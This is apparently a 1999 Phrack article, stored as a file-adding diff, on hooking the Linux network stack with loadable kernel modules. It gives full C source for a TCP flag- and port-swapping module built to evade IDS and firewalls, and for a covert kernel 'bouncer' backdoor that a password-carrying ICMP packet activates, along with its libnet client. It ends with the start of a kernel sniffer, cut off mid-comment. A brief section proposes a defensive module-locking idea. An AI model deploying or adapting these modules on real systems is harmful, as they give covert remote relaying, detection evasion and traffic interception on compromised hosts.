@@ -1,0 +1,1542 @@
+-------[  Phrack Magazine --- Vol. 9 | Issue 55 --- 09.09.99 --- 12 of 19  ]
+
+
+-------------------------[  Building Into The Linux Network Layer  ]
+
+
+--------[  kossak <kossak@hackers-pt.org>, lifeline <arai@hackers-pt.org>  ]
+
+
+----[  Introduction
+
+As we all know, the Linux kernel has a monolithic architecture.  That basically
+means that every piece of code that is executed by the kernel has to be loaded
+into kernel memory.  To prevent having to rebuild the kernel every time new
+hardware is added (to add drivers for it), Mr. Linus Torvalds and the gang 
+came up with the loadable module concept that we all came to love: the linux 
+kernel modules (lkm's for short).  This article begins by pointing out yet more
+interesting things that can be done using lkm's in the networking layer, and
+finishes by trying to provide a solution to kernel backdooring.
+
+
+----[  Socket Kernel Buffers
+
+TCP/IP is a layered set of protocols.  This means that the kernel needs to use
+several routine functions to process the different packet layers in order to
+fully "understand" the packet and connect it to a socket, etc.  First, it
+needs a routine to handle the link-layer header and, once processed there, the
+packet is passed to the IP-layer handling routine(s), then to the transport-
+layer routine(s) and so on.  Well, the different protocols need a way
+to communicate with each other as the packets are being processed.  Under Linux
+the answer to this are socket kernel buffers (or sk_buff's).  These are used to
+pass data between the different protocol layers (handling routines) and
+the network device drivers.
+
+The sk_buff{} structure (only the most important items are presented, see
+linux/include/linux/skbuff.h for more):
+
+sk_buff{}
+--------+
+next    |
+--------|
+prev    |
+--------|
+dev     |
+--------|
+        |
+--------|
+head    |---+
+--------|   |
+data    |---|---+
+--------|   |   |
+tail    |---|---|---+
+--------|   |   |   |
+end     |---|---|---|---+
+--------|<--+   |   |   |
+        |       |   |   |
+--------|<------+   |   |
+Packet  |           |   |
+being   |           |   |
+handled |           |   |
+--------|<----------+   |
+        |               |
+        |               |
+        |               |
+--------+<--------------+
+
+next:   pointer to the next sk_buff{}.
+prev:   pointer to the previous sk_buff{}.
+dev:    device we are currently using.
+head:   pointer to beginning of buffer which holds our packet.
+data:   pointer to the actual start of the protocol data.  This may vary
+        depending of the protocol layer we are on.
+tail:   pointer to the end of protocol data, also varies depending of the
+        protocol layer using he sk_buff.
+end:    points to the end of the buffer holding our packet. Fixed value.
+
+
+For further enlightenment, imagine this:
+
+- host A sends a packet to host B
+
+- host B receives the packet through the appropriate network device.
+
+- the network device converts the received data into sk_buff data structures.
+
+- those data structures are added to the backlog queue.
+
+- the scheduler then determines which protocol layer to pass the received
+  packets to.
+
+Thus, our next question arises...  How does the scheduler determine which
+protocol to pass the data to?  Well, each protocol is registered in a
+packet_type{} data structure which is held by either the ptype_all list or
+the ptype_base hash table.  The packet_type{} data structure holds information
+on protocol type, network device, pointer to the protocol's receive data
+processing routine and a pointer to the next packet_type{} structure.  The
+network handler matches the protocol types of the incoming packets (sk_buff's)
+with the ones in one or more packet_type{} structures.  The sk_buff is then
+passed to the matching protocol's handling routine(s).
+
+
+----[  The Hack
+
+What we do is code our own kernel module that registers our packet_type{} 
+data structure to handle all incoming packets (sk_buff's) right after they
+come out of the device driver.  This is easier than it seems.  We simply fill
+in a packet_type{} structure and register it by using a kernel exported
+function called dev_add_pack().  Our handler will then sit between the device 
+driver and the next (previously the first) routine handler.  This means that
+every sk_buff that arrives from the device driver has to pass first through our
+packet handler.
+
+
+----[  The Examples
+
+We present you with three real-world examples, a protocol "mutation" layer,
+a kernel-level packet bouncer, and a kernel-level packet sniffer.
+
+
+----[  OTP (Obscure Transport Protocol)
+
+The first one is really simple (and fun too), it works in a client-server
+paradigm, meaning that you need to have two modules loaded, one on the client
+and one on the server (duh).  The client module catches every TCP packet with
+the SYN flag on and swaps it with a FIN flag.  The server module does exactly
+the opposite, swaps the FIN for a SYN.  I find this particularly fun since both
+sides behave like a regular connection is undergoing, but if you watch it on
+the wire it will seem totally absurd.  This can also do the same for ports and
+source address. Let's look at an example taken right from the wire.
+
+Imagine the following scenario, we have host 'doubt' who wishes to make a
+telnet connection to host 'hardbitten'.  We load the module in both sides
+telling it to swap port 23 for 80 and to swap a SYN for a FIN and vice-versa.
+
+[lifeline@doubt ITP]$ telnet hardbitten
+A regular connection (without the modules loaded) looks like this:
+
+03:29:56.766445 doubt.1025 > hardbitten.23: tcp (SYN)
+03:29:56.766580 hardbitten.23 > doubt.1025: tcp (SYN ACK)
+03:29:56.766637 doubt.1025 > hardbitten.23: tcp (ACK)
+
+(we only look at the initial connection request, the 3-way handshake)
+
+Now we load the modules and repeat the procedure.  If we look at the wire the
+connection looks like the following:
+
+03:35:30.576331 doubt.1025 > hardbitten.80: tcp (FIN)
+03:35:30.576440 hardbitten.80 > doubt.1025: tcp (FIN ACK)
+03:35:30.576587 doubt.1025 > hardbitten.80: tcp (ACK)
+
+When, what is happening in fact, is that 'doubt' is (successfully) requesting a
+telnet session to host 'hardbitten'.  This is a nice way to evade IDSes and
+many firewall policies.  It is also very funny. :-)
+
+Ah, There is a problem with this, when closing a TCP connection the FIN's are
+replaced by SYN's because of the reasons stated above, there is, however, an
+easy way to get around this, is to tell our lkm just to swap the flags when the
+socket is in TCP_LISTEN, TCP_SYN_SENT or TCP_SYN_RECV states.  I have not
+implemented this partly to avoid misuse by "script kiddies", partly because of
+laziness and partly because I'm just too busy.  However, it is not hard to do
+this, go ahead and try it, I trust you.
+
+
+----[  A Kernel Traffic Bouncer
+
+This packet relaying tool is mainly a proof of concept work at this point.
+This one is particularly interesting when combined with the previous example.
+We load our module on the host 'medusa' that then sits watching every packet
+coming in.  We want to target host 'hydra' but this one only accepts telnet
+connections from the former.  However, it's too risky to log into 'medusa'
+right now, because root is logged.  No problem, we send an ICMP_ECHO_REQUEST
+packet that contains a magic cookie or password and 2 ip's and 2 ports like:
+<sourceip:srcport, destip:destport>.  We can however omit srcport without too
+much trouble (as we did on the example shown below).  Our module then accepts
+this cookie and processes it.  It now knows that any packet coming from
+sourceip:srcport into medusa:destport is to be sent to destip:destport.
+
+The following example illustrates this nicely:
+
+- host medusa has bouncer module installed.
+
+- host medusa receives an magic ICMP packet with:
+  <sourceip:srcprt, destip:dstprt>
+
+- any packet coming to host medusa from `sourceip:srcprt` with destination
+  port `dstport` is routed to `destip`, and vice-versa.  The packets are
+  never processed by the rest of the stack on medusa.
+
+Note that as I said above, in the coded example we removed `srcprt` from the
+information sent to the bouncer.  This means it will accept packets from any
+source port.  This can be dangerous: imagine that I have this bouncing rule
+processed on host 'medusa':
+
+<intruder, hydra:23>
+
+Now try to telnet from 'medusa' to 'hydra'.  You won't make it.  Every packet
+coming back from hydra is sent to 'intruder', so no response appears to the
+user executing the telnet.  Intruder will drop the packets obviously, since he
+didn't start a connection.  Using a source port on the rule minimizes this
+risk, but there is still a possibility (not likely) that a user on medusa uses
+the same source port we used on our bouncing rule.  This should be possible to
+avoid by reserving the source port on host medusa (see masquerading code in
+the kernel).
+
+As a side note, this technique can be used on almost all protocols, even those
+without port abstraction (UDP/TCP). Even icmp bouncing should be possible
+using cookies.  This is a more low-level approach than ip masquerading, and
+IMHO a much better one :)
+
+Issues with the bouncer:
+- Source port ambiguity.   My suggestion to solving this is to accept the
+rules without a source port, and then add that to the rule after a SYN packet
+reaches the bouncer.  The rule then only affects that connection.  The
+source port is then cleared by an RST or a timeout waiting for packets.
+- No timeout setting on rules.
+- The bouncer does not handle IP fragments.
+
+Also, there's a bigger issue in hand.  Notice in the source that I'm sending 
+the packets right through the device they came.  This is a bad situation for 
+routers.  This happens because I only have immediate access to the hardware 
+address of the originating packet's device.  To implement routing to another 
+device, we must consult IP routing tables, find the device that is going to 
+send the packet, and the destination machine's MAC address (if it is an
+ethernet device), that may only be available after an ARP request.  It's tricky
+stuff.  This problem, depending on the network, can become troublesome. 
+Packets could be stuck on 2 hosts looping until they expire (via TTL), or, if
+the network has traffic redundancy, they might escape safely.
+
+
+----[  A Kernel Based Sniffer
+
+Another proof of concept tool, the sniffer is a bit simpler in concept than
+the bouncer.  It just sits in its socket buffer handler above all other
+protocol handlers and listens for, say, TCP packets, and then logs them to a
+file.  There are some tricks to it of course...  We have to be able to
+identify packets from different connections, and better yet, we have to
+order out-of-sequence tcp packets, in order to get coherent results.  This
+is particularly nasty in case of telnet connections.
+
+ (a timeout feature is
+missing too, and the capability
+of sniffing more than one connection at a given moment (this one is tricky).
+
+Ideally, the module should store all results in kernel memory and send them
+back to us (if we say, send it a special packet).  But this is a proof of
+concept, and it is not a finished "script kiddies" product, so I leave you
+smart readers to polish the code, learn it, and experiment with it :)
+
+
+----[  A Solution For Kernel Harassing
+
+So, having fun kicking kernel ass from left to right?  Let's end the tragedy,
+the linux kernel is your friend! :)  Well, I've read Silvio's excellent article
+about patching the kernel using /dev/kmem, so obviously compiling the kernel
+without module support is not enough.  I leave you with an idea.  It should be
+fairly simple to code.  It's a module (yes, another one), that when loaded
+prevents any other modules to load, and turns /dev/kmem into a read-only
+device (kernel memory can only be accessed with ring 0 privilege).  So
+without any kernel routine made available to the outside, the kernel is the
+only one that can touch it's own memory.  Readers should know that this is not
+something new.  Securelevels are (somewhat) implemented in kernels 2.0.x and
+do some cool stuff like not allowing writing directly to critical devices,
+such as /dev/kmem, /dev/mem, and /dev/hd*.  This was not implemented in 2.2.x,
+so it would be nice to have a module like this. When an administrator is
+through loading modules, and wants to leave the system just a bit more secure,
+he loads the 'lock' module, and presto, no more kernel harassing.  This must
+be of course be accompanied by other measures. I believe a real secure system
+should have this module installed and the kernel image file stored on a read
+only media, such as a floppy disk drive, and no boot loader such as lilo.
+You should also be  worried about securing the CMOS data. You just want to
+boot using the floppy.  Securing the CMOS data can be tricky on a rooted
+system as I noticed on a recent discussion on irc (liquidk, you intelligent
+bastard), but this is out of the scope of this article.  This idea could
+also be implemented directly in the kernel without using modules.  Mainly I
+would like to see a real secure levels implementation on 2.2.x :)
+
+
+---[  References
+
++ The Linux Kernel by David A. Rusling 
++ TCP/IP Illustrated, Volume 1 by W. Richard Stevens (Addison Wesley)
++ Phrack Issue 52, article 18 (P52-18) by plaguez.
++ Windows 98 Unleashed by Stev...oh. no. wait, this can't be right... :-)
+
+
+----[  Acknowledgements
+
+Both the authors would like to thank to: 
++ HPT (http://www.hackers-pt.org) for being a bunch of idiots (hehe).
++ pmsac@toxyn.org for support and coming up with the idea for the 
+  kernel based sniffer.
++ LiquidK for coming up with the OTP concept and fucking up some of 
+  our seemingly 'invincible' concepts :)
++ All of you leet hackers from Portugal, you know who you are. 
+  The scene shall be one again!! :)
+
+
+----[  The Code: OTP
+
+<++> P55/Linux-lkm/OTP/otp.c !bf8d47e0
+/* 
+ * Obscure Transport Protocol
+ *
+ * Goal: Change TCP behavior to evade IDS and firewall policies.
+ *
+ * lifeline (c) 1999 
+ * <arai@hackers-pt.org>
+ *
+ * gcc -O6 -c otp.c -I/usr/src/linux/include
+ * insmod otp.o dev=eth0 ip=123.123.123.123
+ *
+ * In ip= use only numerical dotted ip's!!
+ * Btw, this is the ip of the other machine that also has the module.
+ *
+ * Load this module in both machines putting in the ip= argument each other's
+ * machine numerical dotted ip.
+ *
+ * Oh, and don't even think about flaming me if this fucks up your machine,
+ * it works fine on mine with kernel 2.2.5.
+ * This tool stands on its own. I'm not responsible for any damage caused by it.
+ *
+ * You will probably want to make some arrangements with the #define's below.
+ *
+ */
+
+#define MODULE
+#define __KERNEL__
+
+#include <linux/config.h>
+#include <linux/module.h>
+#include <linux/version.h>
+
+#include <linux/byteorder/generic.h>
+#include <linux/netdevice.h>
+#include <net/protocol.h>
+#include <net/pkt_sched.h>
+#include <net/tcp.h>
+#include <net/ip.h>
+#include <linux/if_ether.h>
+#include <linux/ip.h>
+#include <linux/tcp.h>
+#include <linux/skbuff.h>
+#include <linux/icmp.h>
+
+#include <linux/kernel.h>
+#include <linux/mm.h>
+#include <linux/file.h>
+#include <asm/uaccess.h>
+
+
+/* Define here if you want to swap ports also */
+#define	REALPORT	23 		/* port you which to communicate */
+#define FAKEPORT	80		/* port that appears on the wire */
+
+
+char *dev, *ip;
+MODULE_PARM(dev, "s"); 
+MODULE_PARM(ip, "s");
+struct device *d;
+
+struct packet_type otp_proto;
+
+__u32 in_aton(const char *);
+
+/* Packet Handler Function */
+int otp_func(struct sk_buff *skb, struct device *dv, struct packet_type *pt) {
+
+	unsigned long int magic_ip;
+    unsigned int fin = skb->h.th->fin; 
+	unsigned int syn = skb->h.th->syn;
+
+	magic_ip = in_aton(ip);
+
+	if ((skb->pkt_type == PACKET_HOST || skb->pkt_type == PACKET_OUTGOING)
+	&& (skb->nh.iph->saddr == magic_ip || skb->nh.iph->daddr == magic_ip)
+	&& (skb->h.th->source == FAKEPORT) || (skb->h.th->dest == FAKEPORT)) {
+
+		if (skb->h.th->source == FAKEPORT) skb->h.th->source = htons(REALPORT);
+		if (skb->h.th->dest == FAKEPORT) skb->h.th->dest = htons(REALPORT);
+
+		if (skb->h.th->fin == 1) {
+			skb->h.th->fin = 0;
+			skb->h.th->syn = 1;
+			goto bye;
+		}
+		if (skb->h.th->syn == 1) {
+			skb->h.th->fin = 1;
+			skb->h.th->syn = 0;			
+		}
+	}
+
+	bye:
+	kfree_skb(skb);
+    return 0;
+}
+
+/*
+ *      Convert an ASCII string to binary IP.
+ */
+
+__u32 in_aton(const char *str) {
+        unsigned long l;
+        unsigned int val;
+        int i;
+
+        l = 0;
+        for (i = 0; i < 4; i++) {
+                l <<= 8;
+                if (*str != '\0') {
+                        val = 0;
+                        while (*str != '\0' && *str != '.') {
+                                val *= 10;
+                                val += *str - '0';
+                                str++;
+                        }
+                        l |= val;
+                        if (*str != '\0')
+                                str++;
+                }
+        }
+        return(htonl(l));
+}
+
+int init_module() {
+
+	if(!ip) {
+		printk("Error: missing end-host ip.\n");
+		printk("Usage: insmod otp.o ip=x.x.x.x [dev=devname]\n\n");
+		return -ENXIO;
+	}		
+
+	if (dev) {
+		d = dev_get(dev);
+		if (!d) {
+			printk("Did not find device %s!\n", dev);
+			printk("Using all known devices...");
+		} 
+		else {
+			printk("Using device %s, ifindex: %i\n", 
+				dev, d->ifindex);
+			otp_proto.dev = d;
+		}
+	}
+	else
+		printk("Using all known devices(wildcarded)...\n");
+
+	otp_proto.type = htons(ETH_P_ALL); 
+
+    otp_proto.func = otp_func;
+    dev_add_pack(&otp_proto);
+
+	return(0);
+}
+
+void cleanup_module() {
+	dev_remove_pack(&otp_proto);
+    printk("OTP unloaded\n");
+}
+<-->
+
+<++> P55/Linux-lkm/Bouncer/brules.c !677bd859
+/*
+ * Kernel Bouncer - Rules Client
+ * brules.c
+ *
+ * lifeline|arai (c) 1999 
+ * arai@hackers-pt.org
+ *
+ * Btw, needs libnet (http://www.packetfactory.net/libnet).
+ * Be sure to use 0.99d or later or this won't work due to a bug in previous versions.
+ *
+ * Compile: gcc brules.c -lnet -o brules
+ * Usage: ./brules srcaddr dstaddr password srcaddr-rule dstaddr-rule dstport-rule protocol-rule
+ * 
+ * srcaddr - source address
+ * dstaddr - destination adress (host with the bouncer loaded)
+ * password - magic string for authentication with module
+ * srcaddr-rule - source address of new bouncing rule
+ * dstaddr-rule - destination address of new bouncing rule
+ * dstport-rule - destination port of new bouncing rule
+ * protocol-rule - protocol of new bouncing rule (tcp, udp or icmp), 0 deletes all existing rules
+ *
+ * Example: 
+ * # ./brules 195.138.10.10 host.domain.com lifeline 192.10.10.10 202.10.10.10 23 tcp
+ *
+ * This well tell 'host.domain.com' to redirect all connections to port 23
+ * from '192.10.10.10', using TCP as the transport protocol, to the same port,
+ * using the same protocol, of host '202.10.10.10'.
+ * Of course, host.domain.com has to be with the module loaded. 
+ *
+ *  Copyright (c) 1999 lifeline <arai@hackers-pt.org>
+ *  All rights reserved.
+ *
+ */
+
+#include <stdio.h>
+#include <libnet.h>
+
+#define MAGIC_STR argv[3]
+
+int main(int argc, char **argv) {
+
+	struct rule {
+		u_long	srcaddr, dstaddr;
+		u_char	protocol;
+		u_short	destp;
+		struct rule *next;
+	} *rules;	
+	
+    unsigned char *buf;
+    u_char *payload;
+    int c, sd, payload_s={0};
+
+	if (argc != 8) {	
+		printf("Kernel Bouncer - Rules Client\n");
+		printf("arai|lifeline (c) 1999\n\n");
+		printf("Thanks to Kossak for the original idea.\n");
+		printf("Usage: %s srcaddr dstaddr password srcaddr-rule dstaddr-rule dstport-rule protocol-rule\n", argv[0]);	
+		exit(0);
+	}
+
+	rules = (struct rule *)malloc(sizeof(struct rule));
+	rules->srcaddr = libnet_name_resolve(argv[4], 1);
+	rules->dstaddr = libnet_name_resolve(argv[5], 1);
+	rules->destp = htons(atoi(argv[6]));
+	rules->protocol = atoi(argv[7]);
+	if(strcmp(argv[7], "tcp")==0)rules->protocol = IPPROTO_TCP;
+	if(strcmp(argv[7], "udp")==0)rules->protocol = IPPROTO_UDP;
+	if(strcmp(argv[7], "icmp")==0)rules->protocol = IPPROTO_ICMP;
+	rules->next = 0;
+
+	payload = (u_char *)malloc(strlen(MAGIC_STR) + sizeof(struct rule));
+	memcpy(payload, MAGIC_STR, strlen(MAGIC_STR));
+	memcpy((struct rule *)(payload + strlen(MAGIC_STR)), rules, sizeof(struct rule));
+	payload_s = strlen(MAGIC_STR) + sizeof(struct rule);
+
+    buf = malloc(8 + IP_H + payload_s);
+	if((sd = open_raw_sock(IPPROTO_RAW)) == -1) {
+    	fprintf(stderr, "Cannot create socket\n");
+		exit(EXIT_FAILURE);
+    }	
+	
+    libnet_build_ip(8 + payload_s, 0, 440, 0, 64,
+			IPPROTO_ICMP, name_resolve(argv[1], 1), 
+			name_resolve(argv[2], 1), NULL, 0, buf);
+
+
+
+    build_icmp_echo(8, 0, 242, 55, payload, payload_s, buf + IP_H);
+
+    if(libnet_do_checksum(buf, IPPROTO_ICMP, 8 + payload_s) == -1) {
+    	fprintf(stderr, "Can't do checksum, packet may be invalid.\n");
+    }	
+  
+#ifdef DEBUG
+	printf("type -> %d\n", *(buf+20));
+	printf("code -> %d\n", *(buf+20+1));
+	printf("checksum -> %d\n", *(buf+20+2));
+#endif
+
+    c = write_ip(sd, buf, 8 + IP_H + payload_s);
+    if (c < 8 + IP_H + payload_s) {
+		fprintf(stderr, "Error writing packet.\n");
+		exit(EXIT_FAILURE);
+	}
+#ifdef DEBUG
+	printf("%s : %p\n", buf+28, buf+28);
+#endif
+	
+	printf("Kernel Bouncer - Rules Client\n");
+	printf("lifeline|arai (c) 1999\n\n");
+	printf("Rules packet sent to %s.\n", argv[2]);
+
+	free(rules);
+	free(payload);
+	free(buf);	
+}
+<-->
+<++> P55/Linux-lkm/Bouncer/bouncer.c !f3ea817c
+/*
+ * krnbouncer.c - A kernel based bouncer module
+ *
+ * by kossak
+ * kossak@hackers-pt.org || http://www.hackers-pt.org/kossak
+ *
+ * This file is licensed by the GNU General Public License.
+ *
+ * Tested on a 2.2.5 kernel. Should compile on others with minimum fuss.
+ * However, I'm not responsible for setting fire on your computer, loss of
+ * mental health, bla bla bla...
+ *
+ * CREDITS:	- Plaguez and Halflife for an excelent phrack article on
+ * 		  kernel modules.
+ *              - the kernel developers for a great job (no irony intended).
+ *
+ * USAGE: gcc -O2 -DDEBUG -c krnbouncer.c -I/usr/src/linux/include ;
+ *        insmod krnsniff.o [dev=<device>]
+ *
+ * TODO :	- manage to send a packet thru another device than the one 
+ *		  the packet is originating from (difficult, but not important)
+ *		- implement a timeout for the bounce rules
+ * 		- the rules should store a source port for checking the
+ *		  connection (important)
+ *		- turn this into a totally protocol independent IP based 
+ *		  bouncer (quite a challenge :))
+ *
+ * NOTE : don't try to use this module to bounce connections of different
+ * 	  types, such as bouncing packets from a ppp device to an ethernet
+ *	  device and vice-versa. That was not tested and may crash your
+ *	  machine.
+ */
+
+
+#define MODULE
+#define __KERNEL__
+
+#include <linux/config.h>
+#include <linux/module.h>
+#include <linux/version.h>
+
+#include <linux/byteorder/generic.h>
+#include <linux/netdevice.h>
+#include <net/protocol.h>
+#include <net/pkt_sched.h>
+#include <net/tcp.h>
+#include <linux/if_ether.h>
+#include <linux/ip.h>
+#include <linux/tcp.h>
+#include <linux/skbuff.h>
+#include <linux/icmp.h>
+
+#include <linux/kernel.h>
+#include <linux/mm.h>
+#include <linux/file.h>
+#include <asm/uaccess.h>
+
+#include <linux/time.h>
+
+#define DBGPRN1(X)		if (debug) printk(KERN_DEBUG X)
+#define DBGPRN2(X,Y)		if (debug) printk(KERN_DEBUG X, Y);
+#define DBGPRN3(X,Y,Z)  	if (debug) printk(KERN_DEBUG X, Y, Z);
+#define DBGPRN4(X,Y,Z,W)	if (debug) printk(KERN_DEBUG X, Y, Z, W);
+#define DBGPRN5(X,Y,Z,W,V)      if (debug) printk(KERN_DEBUG X, Y, Z, W, V);
+
+#define TRUE  -1
+#define FALSE  0
+
+#define MAXRULES 8			/* Max bouncing rules. */
+#define RULEPASS "kossak"
+
+
+/*
+#define SOURCEIP "a.b.c.d"
+#define DESTIP "e.f.g.h"
+*/
+
+/* global data */
+int debug, errno;
+
+struct rule {
+	__u32		source, dest;
+	__u8		proto;
+	__u16		destp; 		/* TCP and UDP only */
+	struct rule	*next;
+};
+
+/* this is a linked list */
+struct rule *first_rule;
+
+char *dev;
+MODULE_PARM(dev, "s");  /* gets the parameter dev=<devname> */
+struct device *d;
+
+struct packet_type bounce_proto;
+
+/* inicial function declarations */
+
+char *in_ntoa(__u32 in);
+__u32 in_aton(const char *str);
+int filter(struct sk_buff *);
+int m_strlen(char *);
+char *m_memcpy(char *, char *, int);
+int m_strcmp(char *, const char *);
+
+void process_pkt_in(struct sk_buff *);
+void bounce_and_send(struct sk_buff *, __u32 new_host);
+void clear_bounce_rules(void);
+void process_bounce_rule(struct rule *);
+
+
+/* our packet handler */
+int pkt_func(struct sk_buff *skb, struct device *dv, struct packet_type *pt) {
+
+	switch (skb->pkt_type) {
+		case PACKET_OUTGOING:
+			break;
+		case PACKET_HOST:
+			process_pkt_in(skb);
+			break;
+        	case PACKET_OTHERHOST:
+			break;
+		default:
+			kfree_skb(skb);
+			return 0;
+	}
+
+}
+
+
+void bounce_and_send(struct sk_buff *skb, __u32 new_host) {
+
+	struct tcphdr *th;
+	struct iphdr *iph;	
+	unsigned char dst_hw_addr[6];
+	unsigned short size;
+	int doff = 0;
+	int csum = 0;
+	int offset;
+
+	th = skb->h.th;
+	iph = skb->nh.iph;
+
+	skb->pkt_type = PACKET_OUTGOING; /* this packet is no longer for us */
+
+	/* we swap the ip addresses */
+	iph->saddr = skb->nh.iph->daddr;
+	iph->daddr = new_host;
+
+	size = ntohs(iph->tot_len) - (iph->ihl * 4);
+	doff = th->doff << 2;
+ 
+	/* calculate checksums again... bleh! :P */
+	skb->csum = 0;
+	csum = csum_partial(skb->h.raw + doff, size - doff, 0);
+	skb->csum = csum; /* data checksum */
+
+	th->check = 0;
+	th->check = csum_tcpudp_magic(
+		iph->saddr,
+		iph->daddr,
+		size,
+		iph->protocol,
+		csum_partial(skb->h.raw, doff, skb->csum)
+		); /* tcp or udp checksum */
+	ip_send_check(iph); /* ip checksum */
+
+	/* Now change the hardware MAC address and rebuild the hardware  
+	 * header. no need to allocate space in the skb, since we're dealing
+	 * with packets coming directly from the driver, with all fields 
+	 * complete.
+	 */
+	m_memcpy(dst_hw_addr, skb->mac.ethernet->h_source, 6);
+
+	if (skb->dev->hard_header)
+		skb->dev->hard_header(	skb, 
+					skb->dev, 
+					ntohs(skb->protocol), 
+					dst_hw_addr, 
+					skb->dev->dev_addr, 
+					skb->len);
+	else
+		DBGPRN1("no hardware-header build routine found\n");
+		/* send it anyway! lets hope nothing breaks :) */ 
+
+	dev_queue_xmit(skb_clone(skb, GFP_ATOMIC));
+}
+
+void process_bounce_rule(struct rule *ptr) {
+
+	struct rule *new_rule;
+
+	if ( ptr->proto == 0 ) {
+		DBGPRN1("protocol ID is 0, clearing bounce rules...\n");
+		clear_bounce_rules();
+	}
+	else {
+		new_rule = kmalloc(sizeof(struct rule), GFP_ATOMIC);
+		m_memcpy ((char *)new_rule,(char *)ptr, sizeof(struct rule));
+
+		new_rule->next = NULL; /* trust no one :) */
+
+		if (!first_rule) {
+			first_rule = new_rule; /* not 100% efficient here... */
+		}	
+		else {
+			ptr = first_rule;
+			while (ptr->next)
+				ptr = ptr->next;
+			ptr->next = new_rule;
+		}
+	}
+}
+
+/* this is untested code, dunno if kfree() works as advertised. */
+void clear_bounce_rules () {
+	struct rule *ptr;
+
+	while (first_rule) {
+		ptr = first_rule->next;
+		kfree(first_rule);
+		first_rule = ptr;
+	}	
+}
+
+
+void process_pkt_in(struct sk_buff *skb) {
+
+	char *data;
+	int i, datalen;
+	struct rule	*ptr;
+	__u32	host;
+
+	/* fix some pointers */
+	skb->h.raw = skb->nh.raw + skb->nh.iph->ihl*4;
+
+	/* This is an icmp packet, and may contain a bouncing rule for us. */
+	if (skb->nh.iph->protocol == IPPROTO_ICMP) {
+
+		if (skb->h.icmph->type != ICMP_ECHO) return;
+
+		data = (skb->h.raw) + sizeof(struct icmphdr); 
+
+		datalen = skb->len;
+
+		if (m_strcmp(data, RULEPASS)) {
+			DBGPRN1("Found a valid cookie, checking size...\n");
+			i = m_strlen(RULEPASS); 
+			if (sizeof(struct rule) < datalen - i) {
+				DBGPRN1("Valid size, editing rules...\n");
+				process_bounce_rule((struct rule *)(data+i));
+			} 
+			return;
+		}
+	}
+
+	ptr = first_rule;	
+
+	/* search the existing rules for this packet */
+	while (ptr) {
+		if (skb->nh.iph->protocol != ptr->proto) {
+			ptr = ptr->next;
+			continue;	
+		} 
+
+		if (skb->nh.iph->saddr == ptr->source
+			&& skb->h.th->dest == ptr->destp) { 
+			bounce_and_send(skb, ptr->dest);
+			return;
+		}
+
+                if (skb->nh.iph->saddr == ptr->dest
+                        && skb->h.th->source == ptr->destp) {
+			bounce_and_send(skb, ptr->source);
+			return;
+		}
+		ptr = ptr->next;
+	}
+
+}
+
+
+/* init_module */
+int init_module(void) {
+
+#ifdef DEBUG
+        debug = TRUE;
+#else
+        debug = FALSE;
+#endif
+
+	first_rule = NULL;
+
+/* this is for testing purposes only
+	first_rule = kmalloc(sizeof(struct rule), GFP_ATOMIC);
+	first_rule->source = in_aton(SOURCEIP);
+	first_rule->dest = in_aton(DESTIP);
+	first_rule->proto = IPPROTO_TCP;
+	first_rule->destp = htons(23);
+	first_rule->next = NULL;
+*/
+	if (dev) {
+		d = dev_get(dev);
+		if (!d) {
+			DBGPRN2("Did not find device %s!\n", dev);
+			DBGPRN1("Using all known devices...");
+		}
+		else {
+			DBGPRN3("Using device %s, ifindex: %i\n", 
+				dev, d->ifindex);
+			bounce_proto.dev = d;
+		}
+	}
+	else
+		DBGPRN1("Using all known devices...\n");
+
+	bounce_proto.type = htons(ETH_P_ALL);
+
+	/* this one just gets us incoming packets */
+/*	bounce_proto.type = htons(ETH_P_IP); */
+
+	bounce_proto.func = pkt_func;
+	dev_add_pack(&bounce_proto);
+
+	return(0);
+}
+
+void cleanup_module(void) {
+	dev_remove_pack(&bounce_proto);
+
+	DBGPRN1("Bouncer Unloaded\n");
+}
+
+
+/* boring yet useful functions follow... */
+
+/* Convert an ASCII string to binary IP. */
+__u32 in_aton(const char *str) {
+	unsigned long l;
+	unsigned int val;
+	int i;
+
+	l = 0;
+	for (i = 0; i < 4; i++) {
+		l <<= 8;
+		if (*str != '\0') {
+			val = 0;
+			while (*str != '\0' && *str != '.') {
+				val *= 10;
+				val += *str - '0';
+				str++;
+			}
+			l |= val;
+			if (*str != '\0')
+				str++;
+		}
+	}
+	return(htonl(l));
+}
+
+/* the other way around. */
+char *in_ntoa(__u32 in) {
+        static char buff[18];
+        char *p;
+
+        p = (char *) &in;
+        sprintf(buff, "%d.%d.%d.%d",
+                (p[0] & 255), (p[1] & 255), (p[2] & 255), (p[3] & 255));
+        return(buff);
+}
+
+int m_strcmp(char *trial, const char *correct) {
+	char *p;
+	const char *i;
+
+	p = trial;
+	i = correct;
+
+	while (*i) {
+		if (!p) return 0;
+		if (*p != *i) return 0;
+		p++;
+		i++;
+	}
+	return 1;
+}
+
+char *m_memcpy(char *dest, char *src, int size) {
+	char *i, *p;
+
+	p = dest;
+	i = src;
+
+	while (size) {
+		*p = *i;
+		i++;
+		p++;
+		size--;
+	}
+	return dest;
+}
+
+int m_strlen(char *ptr) {
+	int i = 0;
+	while (*ptr) {
+		ptr++;
+		i++;
+	}
+	return i;
+}
+
+/* EOF */
+<-->
+<++> P55/Linux-lkm/krnsniff/krnsniff.c !4adeadb3
+/* 
+ * krnsniff.c v0.1a - A kernel based sniffer module
+ * 
+ * by kossak
+ * kossak@hackers-pt.org || http://www.hackers-pt.org/kossak
+ * 
+ * This file is licensed by the GNU General Public License.
+ *
+ * Tested on a 2.2.5 kernel. Should compile on others with minimum fuss.
+ * However, I'm not responsible for setting fire on your computer, loss of
+ * mental health, bla bla bla...
+ * 
+ * CREDITS:	- Mike Edulla's ever popular linsniffer for some logging ideas.
+ *		- Plaguez and Halflife for an excelent phrack article on
+ *		  kernel modules.
+ *		- the kernel developers for a great job (no irony intended).
+ *
+ * USAGE: gcc -O2 -DDEBUG -c krnsniff.c -I/usr/src/linux/include ; 
+ *	  insmod krnsniff.o [dev=<device>]
+ *
+ * TODO :	- implement a timeout feature (IMPORTANT)
+ *	 	- better support for certain stupid ppp devices that don't set
+ *		  dev->hard_header_len correctly.
+ *		- Parallel logging (like linsniff.c, this thing is still just
+ *		  logging one connection at a time).
+ *		- fix strange kmem grows kernel bitchings (FIXED) ...i think
+ *		- store the logs in kernel memory and send them and clear them
+ *		  when a magic packet is sent.
+ *		- some weird shit happens in my LAN on incoming connections
+ *		  that fucks up the logs a bit, but this was not confirmed
+ *		  on other tests. It has to do with packets not increasing seq
+ *		  numbers, I think.
+ *		- This wasn't tested on a promisc system, but it should work
+ *		  without almost no modifications.
+ *
+ * NOTE: the purpose of this module is to expose the dangers of a rooted 
